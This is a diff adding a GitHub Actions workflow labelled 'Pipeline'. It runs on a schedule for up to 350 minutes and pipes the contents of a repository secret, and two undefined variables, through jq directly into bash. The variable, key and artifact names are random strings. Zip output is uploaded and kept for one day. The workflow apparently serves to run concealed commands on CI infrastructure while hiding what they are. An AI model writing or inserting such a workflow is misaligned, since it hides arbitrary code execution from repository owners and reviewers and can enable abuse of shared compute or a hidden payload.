@@ -1,0 +1,30 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          p283: ${{ secrets.p283 }}
+        run: |
+          printf '%s' "$p283" | jq -r .cwui443 | /bin/bash
+          echo $zgx4191 | jq -r .vrzg3105 | /bin/bash
+          echo $nx53 | jq -r .mwemn4 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bkmJuf4D
+          path: "*.zip"
+          retention-days: 1
